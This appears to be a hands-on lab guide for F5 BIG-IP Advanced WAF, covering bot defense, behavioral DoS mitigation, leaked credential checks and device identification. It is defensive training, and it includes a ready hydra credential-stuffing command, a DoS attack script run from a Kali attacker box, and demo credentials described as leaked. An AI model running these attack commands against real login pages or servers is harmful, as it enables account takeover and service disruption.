2. Choose a name (e.g. mybotprofile), switch the Profile Template to Relaxed and set the Enforcement mode to Transparent. Review the Bot Mitigation Settings and Signature Enforcement, but leave all settings on default for now (We will cover more options in next module).

![image](https://user-images.githubusercontent.com/51786870/211517194-2a30f948-e107-49fe-977f-27b6c49957e3.png)

3. Click Save


## Enable Bot Defense and Logging

1. Navigate to Local Traffic > Virtual Servers > Virtual Server List > vs_Hackazon_I

2. Click on the Security Tab and click Policies.

3. Disable DOS profile and enable Bot Defense and Logging with the profiles created before. (as mentioned before, you can use the preconfigured settings for this demo)

4. Disable Application Security Policy if there is any assinged

5. Click Update

**Note**

`Make sure there is either the existing Logging Profile: L7-DOS_BOT_Logger or the new created Logging Profile attached to this VS.`

![image](https://user-images.githubusercontent.com/51786870/211517720-4bf47407-267c-4b7b-92c2-be64230a78f4.png)

## Start generating Traffic

1. Open a ssh session to the Kali system.

**Note**

`To open a ssh session to UDF you need to provide your public key. For more information, please refer to the UDF documentation.`

2. Make sure you are in the directory:

`/home/ec2-user`

3. Start generating traffic by using the script “baseline_menu.sh”:

```
sudo su
./baseline_menu.sh
choose 1
```

![image](https://user-images.githubusercontent.com/51786870/211518578-f86a74b1-0dca-4ee2-9a1b-709b4690b03b.png)

4. Open another session to Kali linux and run the script

```
./baseline_menu.sh
choose 2
```

it should look like this:

![image](https://user-images.githubusercontent.com/51786870/211519105-86dfeb3a-91b7-4adc-acec-9fb769e68da3.png)

![image](https://user-images.githubusercontent.com/51786870/211519160-163678b9-d2cf-4161-9d47-ee62f99e3d34.png)

5. Navigate to Security > Event Logs > Bet Defense > Bot Traffic and review the Dashboard. Click on the “vs_Hackazon_I” VS to see more details for this specific Application.

![image](https://user-images.githubusercontent.com/51786870/211519606-65318d5a-e8a1-4e45-9b53-3477aa18e91c.png)

**Note**

`It may take some time before you can see some results.`

6. Click on any Bot Categories to see detected Bots (per category)

![image](https://user-images.githubusercontent.com/51786870/211520167-7ad7ce33-bc58-4fae-8a2b-86d7bd5c81e9.png)

7. Go back to the Start Dashboard ans click on “detected Bots” to see all.

![image](https://user-images.githubusercontent.com/51786870/211530593-4d6f5b00-df24-4d6b-8772-a2bd6f5c01bf.png)

### Override settings and create execptions for specific bots

**Note**

`It may occur, that some Bots are detected as false positives and/or the false mitigation action will be applied. In this case, you can create exceptions to override the default settings per bot.`

1. Navigate to Security > Bot Defense > Bot Defense Profiles and click on the profile (either your own or the preconfigured bot-defense-upgraded-from-Hackazon_BaDOS profile).

2. Click on Bot Mitigation Setings

3. On the Bottom, click on Add Exception

![image](https://user-images.githubusercontent.com/51786870/211530696-965b0e02-c2de-4fe4-b267-e19cca13065c.png)

**Note**

`The system automatically stores all seen bots (and based on signatures) sorted by classes and categories.`

4. In the search field type in: curl to filter for this specific type, select curl (category: untrusted bot) and click add.

5. You now can define a specific action for curl, which overrides the global action for this category (untrusted bot). Exceptions are are on a per profile basis. Change the action to “block” and click “Save”.

6. Open a Terminal Server Session to the “Windows Client System” and run the “01-Curl-Bot” batch-file, located on the Desktop.

7. Back in TMUI navigate to Event Logs > Bot Defense > Bot Requests verify the requests seen.

**Note**

`As the baseline script is still running, it may be needed to search for a specific log entry. Click the filter icon and select “denied”, to display only blocked requests.`

**That concludes the lab**

## Exercise 2.2: More Bot Mitigation Techniques

In this Lab we want to get familar with all the additional features avaialble for Bot Defense. The goal is to understand the difference between signature-based and JavaScript-based Detection capabilities and mitigation options.

**Important**
`To only focus on Bot Defense, we will use the "vs_websrv_01_Bot" virtual server for this, because there is no WAF policy attached to it. If you wanna use a different VS, please make sure that there is no WAF policy active.`

![image](https://user-images.githubusercontent.com/51786870/211288466-68ce986b-adb6-4177-8f32-69bbd6fb8bbb.png)


### Create Logging Profile

1. Navigate to **Security > Event Logs > Logging Profiles** and create a new Logging Profile with the settings shown in the screenshot below (local publisher with all options enabled).

2. Give it a name and click **Create**.

![image](https://user-images.githubusercontent.com/51786870/211288619-7a5120c7-f7de-4bde-ad74-37f18888ee4d.png)

### Create Bot Defense Profile

1. Navigate to **Security > Bot Defense > Bot Defense Profiles** and click **Create**.

2. Choose a name (e.g. mybotprofile) and set the Enforcement mode to **Blocking**.

![image](https://user-images.githubusercontent.com/51786870/211288705-06eb5222-3f35-4458-bf95-0db40b7525f8.png)

3. Go to **Mitigation Settings** and change it as seen in the picture below. Leave all other settings as default.

![image](https://user-images.githubusercontent.com/51786870/211288762-465e1c6a-5bf1-4864-91f4-954b6b0a3d7c.png)

4. Go to **Browsers** and make sure that **Browser Verification and Device ID Mode** are **disabled (none)**. Leave all other settings as default.

![image](https://user-images.githubusercontent.com/51786870/211288849-37afe8ef-2709-4178-834b-d8437d4684f3.png)

5. Click Save


### Enable Bot Defense and Logging

1. Navigate to **Security > Overview** and select the "**vs_websrv_01_Bot**" Virtual Server

2. Click on **Attach** and select **Bot Defense Profile**.

![image](https://user-images.githubusercontent.com/51786870/211288992-0bd53e74-35b8-4b50-8dc8-cc127f67e031.png)

3. Choose the profile you’ve just created and click **Attach**

![image](https://user-images.githubusercontent.com/51786870/211289034-d1cb63dd-f89e-49b8-9d8d-dbf0739192e4.png)

4. Do the same for the **Logging Profile** and use the profile you’ve just created.

### Create and review simple Bot-Requests

We will use the “win-client” virtual machine provided by this deployment to create simple Bot-Requests.

1. Open the RDP session if you haven't done so.

![image](https://user-images.githubusercontent.com/51786870/211289245-542a9ca6-810a-47a8-aeb0-5e62e74adda2.png)

2. Double-click on the "**02-Simple-Bot-and-impersonating.bat**" batch file located on the desktop. This will generate three different requests.

![image](https://user-images.githubusercontent.com/51786870/211289339-fe4ff4c0-b17b-486e-9d8b-924be9a2707b.png)

3. Go back to the TMUI and click on: **Security > Event Logs > Bot Defense > Bot Requests**

![image](https://user-images.githubusercontent.com/51786870/211289417-a0c35800-7b21-4831-b438-108a7ee48c30.png)

4. Review all (three) logs and see the “**block**” reason for each request. All requests where classified as malicious bots with the attempt to masquerade as a good bot (i.e. search bot).

**Note**

`All requests were made with curl and customized user agents to simulate different requests/attacks.`

5. Go back to the Windows client and double-click on the "**03-Simple-Bot-masked-as-Chrome-Browser.bat**" batch file.

![image](https://user-images.githubusercontent.com/51786870/211289976-e8f6cd1e-d5a5-4e99-a77a-0ee226d62dd4.png)

6. Go back to the Eventlog and review the result for this request. As you can see both requests were classified as a valid Browser and were allowed. Lets see how we can get more accurate results.

**Note**

`One request was made with curl and a customized user agent, but the other one was made with a headless chrome and a customized user agent to simulate different bots but masked as valid browsers.`

![image](https://user-images.githubusercontent.com/51786870/211290056-8367dbec-9434-462c-8745-1309b579e0f2.png)

![image](https://user-images.githubusercontent.com/51786870/211290077-c65425a2-c171-44ab-8b7c-3deabb048c7e.png)


7. Go to **Security > Bot Defense > Bot Defense Profiles** and select our Bot Defense Profile (**bot_websrv_01**)

8. Within the profile go to **Browsers** and set "**Browser Verification**" to **Verify Before Access** and "**Device ID Mode**" to **Generate Before Access**.

![image](https://user-images.githubusercontent.com/51786870/211290203-c3cf8e4b-c89e-4d44-b9f4-b99cc14330aa.png)

9. Click **Save** and go back to the Windows Client RDP Session.

10. Double-click again on the "**03-Simple-Bot-masked-as-Chrome-Browser.bat**" batch file and review the log entries in the TMUI.

11. As you can see, one request (made with curl) was classified as "**suspicious Browser**" and the status is "**challenged**".

![image](https://user-images.githubusercontent.com/51786870/211290434-fd39045d-2272-4397-954a-b86341a439fb.png)

12. The second one (made with headless chrome and a customized user agent) was classified as "**Browser**" and also challenged. But this time the automated browser was able to solve the JS challenge and the request was allowed.

![image](https://user-images.githubusercontent.com/51786870/211290497-ad6922cf-1554-4a29-8a4d-6f7272a7a75b.png)

![image](https://user-images.githubusercontent.com/51786870/211290516-c11495a3-75ce-4aa4-864b-deec7bf04f4d.png)

**Note**

`This is not part of this LAB but it can be identified with the “CSHUI” part of Bot Defense (Client Side Human Intercation and Counting Anomalies”). It is based on ongoing checks, while the user browses through the application and is looking at HTML responses, for Mouse / Keyboard / Touch anomalies, Rapid surfing or session opening and many others.`

**Note**

`Shape Solutions can provide the same and even more accurate results because of the more advanced JS and the AI based classification.`


# Class 2 Module 2
# Module 2: Behavioral DOS Protection

In this lab you will run baseline tests as well as attacks against a Virtual Server to trigger Behavioral DoS
Protection

# Connect to the Lab Environment

1. On the win-client, use a browser to reach the BIG-IP and login 
2. From your host from UDF, open three terminals, one to the BIG-IP and two to the Kali Linux Client. Sessions should be already authenticated

**BIGIP**

![image](https://user-images.githubusercontent.com/51786870/211293748-a7b5e949-bed6-482b-84a1-b61f6b72d14c.png)

**Kali**

![image](https://user-images.githubusercontent.com/51786870/211294016-d5824528-e8ec-40b0-92a4-1bdbda5a2e87.png)

**Note**

`The kali client will be used as the attacker machine for this lab. You may want to open multiple
terminal windows to go through the steps in the lab.`

### Examine the DoS Profile

1. In TMUI, go to **Local traffic > Virtual Servers > Virtual Server List > 	vs_Hackazon_I**

2. Select the Security tab and then Policies. Make sure that DoS Profile and Log Profile are set up as below.

![image](https://user-images.githubusercontent.com/51786870/211294497-0423c996-47e4-4f50-b1b1-31411084e161.png)

3. Select the resources tab above. Note the **iRule** that is applied.

![image](https://user-images.githubusercontent.com/51786870/211294610-fdc4ab30-9e7a-4428-9d57-3050d8a82665.png)


**Note**

`This is not a real world scenario. Attacks would typically come from a wide range of IP addresses. In this demo environment, we do not have dozens of good and bad source IPs available for clients and attackers. We simulate them by adding an iRule to the VS, which adds a randomized X-Forwarded-For header to each
request. 

4. Go back to the **Properties** tab and notice that the http profile is also customized. It is configured to accept XFF for the iRule to function correctly.

5. Go to **Security > DoS Protection > DoS Profiles > Hackazon_BaDOS** and select the Application Security tab.

![image](https://user-images.githubusercontent.com/51786870/211295958-fe2a131f-b56c-414e-95a3-37dcc9097df0.png)

6. Select TPS-based Detection tab and ensure that it is turned off.

![image](https://user-images.githubusercontent.com/51786870/211295894-27f498ab-574f-4e37-895c-9ec74cdf3d8c.png)

**Note**

`You do not have to Apply the Policy when editing a DoS Profile unlike typical changes under Application Security.`

7. Select Behavioral and Stress-based Detection and click **Edit** under **Behavioral Detection and Mitigation**.

![image](https://user-images.githubusercontent.com/51786870/211296296-9406ed3e-6ff0-4c0f-9310-a513111d9ce6.png)

8. Notice that “**Use approved signatures only**” is unchecked. If checked, we would need to approve each dynamic signature. No need to edit, click **Close**.

![image](https://user-images.githubusercontent.com/51786870/211296467-c6f2f07c-dade-44aa-bda4-fe9e46191e6f.png)

9. The Behavioral DoS profile is already applied and ready to go. Move on to the next section to begin analyzing traffic.


### Create Baseline traffic for the BIG-IP

1. In one of the Kali Linux terminal sessions, change go to the scripts directory **cd /home/ec2-user** and take a look at bash scripts that have been created.

![image](https://user-images.githubusercontent.com/51786870/211296861-00103005-018f-479c-9f99-dc4c65fc81da.png)

2. As a first step we will use one of those scripts named **baseline_menu.sh** to generate legal traffic which will learn AWAF the baseline of the normal user traffic.

3. In one of your **Kali Linux** terminal windows, examine your home directory and run the "**baseline_menu.sh**" script and select second option "**alternate**".

`./baseline_menu.sh`

![image](https://user-images.githubusercontent.com/51786870/211297673-12a7e352-30b2-463d-a44f-4fcdfb4d3be9.png)


5. In a second Kali terminal window, run the script again, but select the other option.

**Note**

It does not matter which order is used here, and the results of baseline testing are not an exact science

![image](https://user-images.githubusercontent.com/51786870/211297995-99bb9f7e-ae14-4144-badf-ee6e3438479a.png)


6. Go back to your BIG-IP terminal window and run an admd command as shown below

admd -s vs./Common/vs_Hackazon_I+/Common/Hackazon_BaDOS.info.learning

**Note**

`Given the parameters of the Virtual Server and the corresponding DOS profile, admd returns stats on traffic learning. We want to wait until the first number in the brackets is 90 or above. This represents the percentage confidence the system has in baseline traffic.`

![image](https://user-images.githubusercontent.com/51786870/211298526-8b5a76d7-9edb-4911-8335-5431843c5142.png)

Another screenshot of sample output below:

![image](https://user-images.githubusercontent.com/51786870/211298905-e7b6d7ac-9c3c-4369-a054-ada2cacfa9a7.png)

**Tip**

`If your aren’t getting any output, or seeing no signs of accumulated signals, verify the name of the virtual server and profile in the admd command are accurate.`

   * **1 - baseline_learning_confidence:**
   * Description: in % how confident the system is in the baseline learning.
   * Desired Value: > 90%
   * **2 - learned_bins_count:**
   * Description: number of learned bins
   * Desired Value: > 0
   * **3 - good_table_size:**
   * Description: number of learned requests
   * Desired Value: > 2000
   * **4 - good_table_confidence:**
   * Description: how confident, as %, the system is in the good table
   * Desired Value: Must be 100 for signatures

**Note**

`**It may take 5 or more minutes before you begin to get learned baseline numbers. Also, the desired values are the minimum values we would like to see prior to triggering attacks as part of this lab exercise. Do not stop baseline traffic script**`

To see all of the values available and wide range of interesting statistics, enter the following command from BIG-IP console:

`admd -s vs./Common/vs_Hackazon_I`

To view Advanced Web Application Firewall layer 7 DoS log, enter the following command from BIG-IP console:

`tail -f /var/log/dosl7/dosl7d.log`

### Request Signatures

In this task  you will be initiating a L7 DDoS attack on the hackazon virtual server, from Kali linux. Source IP will match XFF_mixed_Attacker_Good_iRule, and an X-Forward-For header will be inserted in the HTTP request in the 132.173.99.0/24 IP address range.

Once the attack begins the BIG-IP WAF will immediately switch into attack mode due to the server health deteriorating almost immediately. As the server gets totally overwhelmed, you may at first notice the good script dropping requests. That’s why BaDoS first mitigates with a global rate limit just to protect the server. In a short time, the good script will go back to all 200 OK responses. During this time Behavioral DoS identifies anamolous traffic and generates Dynamic Signatures matching only the malicious traffic. Once mitigation is in effect, the server health will rapidly improve and application performance will return to normal.

1. Using your Browser open another session to Kali Linux web shell leaving the two other running with baseline traffic scripts

2. Navigate to **Security ›› DoS Protection:Signatures** and click on the **Dynamic** box, then set the **Refresh** value to 20 secs.

![image](https://user-images.githubusercontent.com/51786870/211300038-64258e36-1658-44df-b3ce-ac11ebda4990.png)

**Note**

`The list of the signatures should be empty as we didn't run any attack yet`

3. Open another tab/window in Browser, and go to **Security ››Reporting : DoS : Dashboard**. The dashboard is NOT real time in may take up to 10 minutes for traffic to display.

4. Revisit the Terminal window you opened earlier which is monitoring behavioral DoS learning signals. Verify the first number (baseline_learning_confidence) is at or above 80%. Normally, above 90% would be ideal, but for the purposes of this lab over 80% will suffice.

![image](https://user-images.githubusercontent.com/51786870/211300431-3fcc4fc4-c2dc-44da-82dd-a16e674d063c.png)

5. Revisit the Terminal window you opened earlier which is still running the baseline traffic generation script. Make note of the normal, pre-attack, response time for each request.

![image](https://user-images.githubusercontent.com/51786870/211300478-9e3108f9-5aed-45ac-91a9-d154a2512462.png)

6. From another shell session from Kali Linux run the attack by entering commands below

`cd /home/ec2-user/
./AB_DOS.sh`

Select **2** – Attack start - score

![image](https://user-images.githubusercontent.com/51786870/211301096-2b2278f8-3f13-4742-85b8-7eabf653ef91.png)


### Examine the Mitigation

1. On TMUI, go to **Security > DoS Protection > Signatures** and click on the bar for Dynamic or open the browser tab with those signatures. You should see an entry similar to the below (this may not show up right away, revisit the page until an entry appears).

![image](https://user-images.githubusercontent.com/51786870/211301243-400b8d86-4658-471d-951e-d4434eb17495.png)

Click on one of the signatures to expand detailed information about it 

![image](https://user-images.githubusercontent.com/51786870/211302006-8c16c736-1973-449b-ba5a-f34034f10f74.png)


2. Open another tab to the GUI on BIGIP, and navigate to **Security ›› Event Logs ›› DoS ›› Application Events**

Almost immediately you should see an attack has started, and Advanced Web Application Firewall has assigned an Attack ID to the event. You will see something similar to the screenshot below:

![image](https://user-images.githubusercontent.com/51786870/211301600-2a0feecb-3db2-4812-b436-f79fa382cd65.png)

**Note**

`Notice that the attack Mitigation was Behavioral. This means a dynamic signature was created and enforced to mitigate the attack.`

3. Review the Dynamic Signatures UI page opened in step #2. It might take a few moments for a dynamic signature(s) to generate, but shortly after the attack has been detected a signature should be created. Once a signature(s) is generated, if you click on the signature (NOT on the blue link, but somewhere on the signature bar), you will get the details about the signature in Wireshark format. Also, you can examine the current status of the signature (mitigating or not), and statistics on recent attacks which used the signature.

![image](https://user-images.githubusercontent.com/51786870/211301743-7cc39f2f-2d43-461c-89f4-103584ca1bdd.png)

**Signature ID**: Signature ID generated for this signature. You can use the signature ID in DoS Analysis/Dashboard views (explored in module 6) to get more details on actions taken by this signature.

**Deployment State**: current state of the signature. Options include:

  * **Mitigate** - Collect stats, learn, alert, and mitigate. All thresholds and threshold actions are applied, and rate limiting occurs if the device is under high stress.
  * **Detect Only** - Collects stats, learn, and alert. Develops dynamic signatures without enforcing any thresholds or limits.
  * **Learn Only** - Collect stats and learn. Develops dynamic signatures without enforcing any thresholds or limits
  * **Disabled** - No stat collection or mitigation, totally disables the signature.

**Attack Status** - the state of the signature with respect to ongoing attacks. Specifically, defines whether this particular signature is being used to mitigate an on-going attack.

**Attack ID** - the attack ID for the attack that generated this signature. Clicking the attack ID will take you to the DoS Analysis views filtered on this attack ID.

**Predicates List** - the conditions for the request to be associated with this signature. Includes one or more match ,expresssions, joined by logical operators, which the system uses to match traffic causing a DoS attack.

**Attack History** - provides an account of all attacks in which this signature has been used to mitigate.

**Note**

`Dynamic Attack signatures generated will remain in the list up to the max number of signatures supported, and will be will re-used whenever an attack is detected, and traffic matches the conditions defined in the signature`

4. With the attack script still running, examine the output of the baseline script. You should be getting HTTP 200 OK responses, and the response time should be inline with pre-attack response times. Also, verify you can use browse to the website without issue.

5. In the window where you are running the attack script, enter CTRL-C, then type 4 to kill the attack script cleanly.

6. Go to **Security  ››  Reporting : DoS : Dashboard** to examine the information about detected DOS attack

![image](https://user-images.githubusercontent.com/51786870/211302584-8483babd-7d80-4703-9154-2c4baed00c06.png)

7. Go to **Statistics  ››  Dashboard** and then select **Behavioral DoS** view

![image](https://user-images.githubusercontent.com/51786870/211302855-fa051400-d595-4334-8737-c18b64244b54.png)

8. Click on the virtual server that is under attack or the attack itself to examine detailed information about the attack

![image](https://user-images.githubusercontent.com/51786870/211303058-5aadc779-0762-4d41-a797-4a724b9aa703.png)

![image](https://user-images.githubusercontent.com/51786870/211303132-752b4d2b-f903-418c-bf42-08c644177e69.png)

**The new dashboard provides:**
   * Client HTTP Transactions
   * Client HTTP Requests & Transactions
   * Server HTTP Transactions
   * Concurrent Server-Side Connections
   * Server Stress
   * Server Queue
   * TLS Handshake
   * Connections Mitigation
   * Layer 3-4 & SSL Mitigations
   * HTTP Mitigation
   * CPU - Utilization
   * Memory - Utilization

**The new Dashboard also provide the ability to:**

   * Zoom-in and Zoom-out
   * Show legends of each chart, on placing mouse on any chart
   * Custom time selection view

![image](https://user-images.githubusercontent.com/51786870/211303432-c2504903-2105-4c61-98cf-beee9dad9d1f.png)

**Note**

`Do not move on without ending these attack and baseline scripts, as they may have an effect on the rest of the labs`

9. In each of your terminal windows type Ctrl+C to terminate the scripts. The AB_DOS.sh script will require you to enter 4 to quit after pressing Ctrl+C..

**This concludes Class 2**


# Class 3

# Class 3 Module 1
# Module 1: Leaked Credential Check - Credential Stuffing

In this module, we will Demo Leaked Credentials Check (LCC) to detect ATO attacks and provide a compliance check for NIST guidance with a single login attempt with leaked credentials.

**Warning**

`Don´t use the Application ID / Access Token outside of F5 and for production. Application ID / Access Token to be used for demo purposes only!!!`

**Leaked Credentials Check Overview**

Leaked Credential Check (LCC) provides access to a database of compromised credentials, which can be used to detect ATO attacks and provide a compliance check for NIST guidance. LCC is an add-on feature to BIG-IP Advanced WAF which been consumed as a subscription service.

**Advantages of F5 Leaked Credential Check (LCC)**

   * Integrated with F5 Advanced WAF; Can be enabled within minutes.
   * LCC policy can be managed and enforced by the application owner.
   * Flexible deployment options based on number of users; Not based on number of AWF instances.
   * Policy configuration and enforcement can be automated via tmsh CLI and BIG-IP REST API.

### Flow trough the Demo

Login to that BIG-IP instance to check the LCC configuration. The Password of the BIG-IP instance is listed within the **Details / Documentation Tab**.

1. Within **Security › Application Security > Security Policies > Policies List** you´ll notice a Security Policy named **Leaked-Credential-Check**.

2. The Policy is attached to Virtual Server **vs_arcadia.emea.f5se.com_II** and Hackazon_protected_vs.

![image](https://user-images.githubusercontent.com/51786870/211305614-e4fd6370-ef2d-4aa7-917b-ecca717ce18b.png)

![image](https://user-images.githubusercontent.com/51786870/211305769-4aa81c97-6870-4b6e-ad8a-f577a114f9b6.png)

3. Check the LCC configuration under **Security › Cloud Services > Cloud Security Services Applications > f5-credential-stuffing-cloud-app.**

4. You will notice a predefined API Key ID and API Key Secret configuration. Additional the Endpoint which will be used is called f5-credential-stuffing-blackfish.

![image](https://user-images.githubusercontent.com/51786870/211305955-d8080468-ae42-4dd6-ac83-a47862ac1bc1.png)

**Note**

`In the 15.1.1 the colour of the traffic light only reflects what happened when a credential check attempt was last made. Before that the icon will stay blue (unknown). lt is not a health monitor which can be used to indicate the current state of the service or whether the service has expired etc.`

![image](https://user-images.githubusercontent.com/51786870/211306118-ebc2ff6b-bc98-419a-8190-0188f9373a8c.png)


5. The LCC feature is configured within the Brute-Force Protection profile. Normally a login page is specified for the login credentials to be captured by Advanced WAF. The information required to manually identify the login URL can be found by reviewing the HTML source code and snooping the HTML traffic generated as a user logs into the site (e.g. keyboard F12).

6. Go to **Security  ››  Application Security : Security Policies : Policies List  ››  Leaked-Credential-Check** open a tab **Sessions and Logins** and examine the configuration

![image](https://user-images.githubusercontent.com/51786870/211307080-1a503f4c-53b9-4fca-b973-309c2e0fcc1b.png)

7. Click **Edit Login Page**

![image](https://user-images.githubusercontent.com/51786870/211307506-3eebdc17-7e8d-4cae-84f4-c6730bd364e5.png)


**Note**

`There is also the option to create login pages automatically Creating Login Pages for Secure Application Access.`

![image](https://user-images.githubusercontent.com/51786870/211307599-f6dfda33-1d26-4298-beb2-2ee20965c378.png)

8. Leaked Credential Detection is enabled within the **Advanced Protection** and then in **Brute Force Protection** configuration tab.

![image](https://user-images.githubusercontent.com/51786870/211307918-a2f3c3bd-cee5-40cd-8c98-34b1e9d045b1.png)

9. Click **/user/login** and review the configuration. 

![image](https://user-images.githubusercontent.com/51786870/211308155-002b5e78-b07e-430d-aaee-5c9a232c58a7.png)

![image](https://user-images.githubusercontent.com/51786870/211308219-375a9de6-5ee2-4af0-a857-b1443aea4064.png)

10. Within that demo Learning and Blocking Settings for Leaked Credential Detection have been set to **Alarm and Leaked Credentials Page**.

![image](https://user-images.githubusercontent.com/51786870/211308509-916f7e69-cb2d-4533-829e-dde503b8a442.png)

11. RDP to windows machine called win-client if you haven't done so. The Password of the instance is listed within the Details / Documentation Tab.

12. Launch Chrome. Spot the Folder called **Leaked Credentials Check demo** and choose the bookmark called **Hackazon — Login**.

![image](https://user-images.githubusercontent.com/51786870/211309464-2aeb83d2-c195-4fc1-ac48-e5f9c0eed063.png)

13. Login with username **demo33@fidnet.com** and password **mountainman01**

14. Your login is not blocked by LCC because the policy is in transparent mode but those credentials are known as leaked credentials.

![image](https://user-images.githubusercontent.com/51786870/211309838-bcdaac6f-12e5-4df0-b47e-fa8a3596d501.png)

15. Switch the policy to blocking mode, retest and go back to to the BIG-IP instance to check in the request log for the blocked request with the Leaked credentials detection violation.

![image](https://user-images.githubusercontent.com/51786870/211310765-9b23c219-5c8c-4eaf-a587-7c6ff6369d27.png)

![image](https://user-images.githubusercontent.com/51786870/211310854-c3e1a97e-b09b-4627-9023-0a3dcb920b30.png)



### Demo Leaked Credentials Check with a Script

**Note**

`In this demo you can do it without ASM enabled first - Hydra will find credentials and password that worked, and then do it with ASM enabled.`


1. Remove AWAF policy from Virtual Server 	**vs_Hackazon_IV** with IP 10.1.10.78 on BIG-IP and launch the attack


   * SSH or use Web Shell of UDF Instance called kali.

   * Run `sudo su`.
   
   * Check you are in directory `/home/ec2-user`, else move to this directory.

   * Launch the Brute Force stuffing attack (be careful, copy paste does not work every time because of the “”).

   * `hydra -C cred_list.txt -V -I 10.1.10.78 http-form-post "/user/login?return_url=:username=^USER^&password=^PASS^:S=My Account"`

   * This is the VS on the BIG-IP named **vs_Hackazon_IV**.

   * Within your Putty or Web Shell Session You should see one line with [80][http-post-form] host: 10.1.10.78   login: demo33@fidnet.com   password: mountainman01. This means attack passed with this credential.

![image](https://user-images.githubusercontent.com/51786870/211312381-d2ac1e53-01b2-476a-b799-dc7948b0a3c8.png)

2. Login to Hackazon (demo33@fidnet.com/mountainman01 or with the previous stolen cred), to show it works and that you are not blocked.

3. Try with a distributed attack. Here we simulate a Bot network sending a Credential Stuffing attack with thousand leaked credentials.

   * Enable ASM policy **Leaked-Credential-Check** on VS **vs_Hackazon_IV**.

   * SSH or use Web Shell of UDF Instance called kali.

   * Check you are in directory /home/ec2-user, else move to this directory.

   * Launch the Brute Force stuffing attack (be careful, copy paste does not work every time because of the “”).

   * `hydra -C cred_list.txt -V -I 10.1.10.78 http-form-post "/user/login?return_url=:username=^USER^&password=^PASS^:S=My Account"`. 

   * Keep attack on going and RDP to windows machine called win-client.

   * Launch Chrome and click Hackazon login bookmark.

   * Login as demo33@fidnet.com/mountainman01, you should be blocked. 

   * Go to BIGIP and check Brute Force and cred stuffing logs Security > Event Logs > Application > Brute Force Attack.

![image](https://user-images.githubusercontent.com/51786870/211322275-3f162024-44b9-4b57-86cd-cd421fa719e2.png)

![image](https://user-images.githubusercontent.com/51786870/211322402-8d3807ee-a59c-4414-b464-3e14e9c943b4.png)

### Additional information

The following cloud related commands could help to identify whether the cloud connection is working.

`tmsh show security cloud-services application-stats`

![image](https://user-images.githubusercontent.com/51786870/211322665-aa274482-3152-4fec-bf5e-87ea085d6e8c.png)


`tmctl app_cloud_security_service_stat`

![image](https://user-images.githubusercontent.com/51786870/211322759-c8653438-ee0f-44f2-b1cd-a9a16c020070.png)



# Class 3 Module 2
# Module 2: Check how Application Traffic Insights works

In this module, we will work with Application Traffic Insights and get the identifier reported back into /var/ltm/log of BIG-IP. Additional BIG-IP reports into ELK Stack and within the ELK Dashboard we correlate data i.e. Device Identifier, User, IP and Unified BOT Information for anaylses.

**Application Traffic Insights Overview**

Application Traffic Insight (ATI) is a Proof of Value (PoV) tool that allows customers to explore different Shape products and understand their benefits and value (free of charge for a period of 60 days). ATI is an easy-to-use, self-service deployment with multiple deployment options on a variety of platforms (F5 or otherwise).

Application Traffic Insights is easy-to-use as it allows flexible and easy deployment using Big-IP, NGINX, SSE, AWS and JS snippet Give the customer compelling Proof of Value (PoV) charts/dashboards.

**Device Traffic Dashboard**

![image](https://user-images.githubusercontent.com/51786870/211323585-f3c58ead-76b8-4b82-acc2-014bbeac53ba.png)

**Bot Assessment Dashboard**

![image](https://user-images.githubusercontent.com/51786870/211324888-69bd2523-5ea0-459b-a077-02054deaf6aa.png)

### Check how Application Traffic Insights Overview* works

1. Connect to BIG-IP via TMUI. 

2. Within the WebUI of the BIG-IP instances navigate to **iApps › Application Services : Applications › Application_Traffic_Insight** and select **Reconfigure**.

![img_class3_module2_animated_2](https://user-images.githubusercontent.com/51786870/211324805-39336990-8b23-4e70-8138-7d2ab4b6a3e6.gif)


3. Within the iApp configuration you will find predefined JS Injection configuration in the 1JS part. Furthermore the 1JS gets been injected on the Virtual Server named arcadia.emea.f5se.com_vs. We leave the rest of the configuration untouched.

![img_class3_module2_animated_3](https://user-images.githubusercontent.com/51786870/211324745-d17f1b77-fd58-4a91-804e-4b6b7181de4f.gif)

**Note**

`https://docs.cloud.f5.com/docs/how-to/advanced-security/ati/ cover the Application Traffic Insight onboarding in more detail.`


### Application Traffic Insights and iRule

Application Traffic Insights includes two identifiers - a residue-based identifier and an attribute-based identifier. The residue-based identifier is based on local storage and cookies. The attribute-based identifier is based on signals collected on the device. The two identifiers always have different values.

1JS writes both the residue-based and attribute-based identifiers in a single, first-party cookie called _imp_apg_r_. The _imp_apg_r_ cookie is URL encoded with the following format:

`%7B%22diA%22%3A%22AT9cyV8AAAAAd60uXCtYafPTZGLaVAku%22%2C%22diB%22%3A%22ASJ4gFmzPo%2Fa8AHJceWhykudRoXeBGlP%22%7D`

This cookie can be decoded via https://www.urldecoder.org/ to get the response in clear text. The decoded cookie has the following format:


`"diA": "AT9cyV8AAAAAd60uXCtYafPTZGLaVAku"
"diB": "ASJ4gFmzPo/a8AHJceWhykudRoXeBGlP"`

**Note**

`Here, diA represents the residue-based identifier and diB represents the attribute-based identifier.`


### How to decode Application Traffic Insights _imp_apg_r_ cookie with an iRule

1. Within BIG-IP we use an iRule named print_deviceid and do a URL decoding of the _imp_apg_r_ cookie and log diA and diB into /var/log/ltm of BIG-IP.

2. The irule named print_deviceid has been attached to Virtual Server named arcadia.emea.f5se.com_vs.

![img_class3_module2_animated_4](https://user-images.githubusercontent.com/51786870/211325418-1585d5db-e23b-4b9d-9d96-93cf13169e66.gif)

### How to test Application Traffic Insights

1. To verify and view the logged values, connect to BIG-IP via SSH.

2. Run run util bash followed by **tail -f /var/log/ltm** in the SSH Session.

3. RDP to windows machine called win-client if you haven't done so.

4. Launch Chrome.

5. Open Devtools (Keyboard F12), select XHR in the Devtools and select the Browser Tab named Device ID check.

6. Check the request and response in Chrome.

7. Also check the cookie on the Devtools under Application.

![img_class3_module2_animated_5](https://user-images.githubusercontent.com/51786870/211325751-feaf1f4c-c18b-4e35-9eef-974c998a9d45.gif)

8. You may want to do further test by running Chrome in Incognito Modus and compare the values of diA and diB with the outcome of the previous test.

9. Also check tail -f /var/log/ltm in the SSH Session as the values of diA and diB of the _imp_apg_r_ cookie have been written to the file.

![img_class3_module2_animated_6](https://user-images.githubusercontent.com/51786870/211325835-0d54ffb8-b543-4812-8164-66293e06cd94.gif)

### Application Traffic Insights and ELK 

Within the UDF Environment you will find an instance called ELK. Here we run an ELK Container which is used to visualize Device Identifier and correlate data i.e. Username to Device ID; Geo IP to Device ID. Additional AWF Unified Bot Protection log events into ELK. Those logs been correlated as well.


1. RDP to windows machine called win-client. The Password of the instance is listed within the Details / Documentation Tab.

2. Launch Chrome and choose the bookmark called Kibana - Dashboard.

